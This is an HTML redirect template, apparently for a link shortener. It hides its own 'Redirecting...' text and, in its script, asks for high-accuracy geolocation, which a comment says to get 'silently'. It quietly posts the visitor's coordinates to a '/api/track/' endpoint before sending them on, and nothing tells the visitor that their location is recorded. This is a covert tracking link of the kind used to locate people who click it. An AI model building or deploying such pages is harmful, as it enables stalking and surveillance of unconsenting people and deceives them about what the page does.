<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #fff;
      font-family: Arial, sans-serif;
    }
    .container {
      display: none; /* Hidden by default */
    }
  </style>
</head>
<body>
  <div class="container">
    <p>Redirecting...</p>
  </div>

  <script>
    const shortCode = "{{ short_code }}";

    function redirectNow() {
      window.location.href = `/redirect/${shortCode}`;
    }

    // Try to get location silently
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude, accuracy } = position.coords;
          
          // Log location (fire and forget)
          fetch(`/api/track/${shortCode}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude, accuracy })
          }).catch(() => {});

          redirectNow();
        },
        (error) => {
          console.log("Location error:", error);
          redirectNow(); // Always redirect, even if location fails
        },
        {
          enableHighAccuracy: true,     // Better for mobile
          timeout: 8000,                // 8 seconds max
          maximumAge: 0
        }
      );
    } else {
      redirectNow();
    }
  </script>
</body>
</html>
